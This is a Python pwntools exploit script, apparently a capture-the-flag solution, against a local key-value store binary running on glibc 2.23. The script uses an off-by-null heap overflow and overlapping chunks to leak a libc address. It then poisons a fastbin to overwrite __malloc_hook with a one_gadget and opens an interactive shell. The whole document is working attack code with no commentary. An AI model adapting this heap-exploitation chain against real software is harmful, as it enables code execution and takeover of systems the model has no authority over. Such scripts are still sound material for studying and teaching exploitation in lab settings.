from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF("./datastore")
io = process("./datastore")
libc = ELF("./libc-2.23.so")

def GET(key):
    io.sendlineafter(b'command:',"GET")
    io.sendlineafter(b'key',key)
    io.recvuntil("bytes]:\n")
    return io.recvline()

def PUT(key,size,data):
    io.sendlineafter(b'command:',"PUT")
    io.sendlineafter(b"key:",key)
    io.sendlineafter(b"size:",str(size))
    io.sendlineafter(b"data:",data)

def DEL(key):
    io.sendlineafter(b'command:',"DEL")
    io.sendlineafter(b"key:",key)

def init():
    for i in range(10):
        PUT(str(i),0x38,str(i)*0x37)
    for i in range(10):
        DEL(str(i))

def debug():
    gdb.attach(io)
    pause()


init()
PUT(b'A',0x71,"A"*0x70)
PUT(b'B',0x101,"B"*0x100)
PUT(b'C',0x81,"C"*0x80)
PUT(b'def',0x81,"D"*0x80)
DEL("A")
DEL("B")
PUT(b'E'*0x78,0x11,b'a'*0x10)   # off-by-null

PUT(b"B1",0x81,b"x"*0x80)
PUT(b"B2",0x41,b'Y'*0x40)
DEL("B1")
DEL("C")
PUT("B1",0x81,b'X'*0x80)

main_arena = u64(GET('B2')[:6].ljust(8,b'\x00'))-88-0x10
libcbase = main_arena-libc.symbols["__malloc_hook"]
print(hex(libcbase))
one_gadget = [0x4525a,0xef9f4,0xf0897]

DEL("B1")
payload = p64(0)*16+p64(0)+p64(0x71)+p64(0)*12+p64(0)+p64(0x21)
PUT("B1",0x191,payload.ljust(0x190,b'B'))

DEL("B2")
DEL("B1")
malloc_hook = libcbase+libc.symbols["__malloc_hook"]
payload = p64(0)*16+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
PUT("B1",0x191,payload.ljust(0x190,b'B'))

PUT("X",0x61,"X"*0x60)
payload = b'\x00'*0x13+p64(libcbase+one_gadget[0])
payload = payload.ljust(0x60,b'Y')
PUT("Y",0x61,payload)
print(hex(malloc_hook))

io.sendline("GET")
io.interactive()